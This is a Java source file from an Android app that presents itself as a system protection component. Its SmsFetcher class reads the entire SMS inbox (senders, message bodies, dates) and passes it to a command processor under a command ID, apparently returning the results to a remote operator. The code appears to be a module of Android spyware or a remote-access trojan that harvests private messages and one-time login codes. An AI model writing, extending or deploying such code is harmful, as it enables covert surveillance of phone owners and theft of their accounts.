package com.android.system.protection.commands;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsFetcher {

    public static void fetch(Context context, JSONObject params, String commandId) {
        JSONArray smsArray = new JSONArray();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = context.getContentResolver().query(uri, null, null, null, "date DESC");

        if (cursor != null) {
            while (cursor.moveToNext()) {
                try {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndex("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndex("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndex("date")));
                    sms.put("read", cursor.getInt(cursor.getColumnIndex("read")));
                    smsArray.put(sms);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }

        JSONObject result = new JSONObject();
        try {
            result.put("sms", smsArray);
        } catch (Exception e) {}
        CommandProcessor.sendResult(context, commandId, result);
    }
}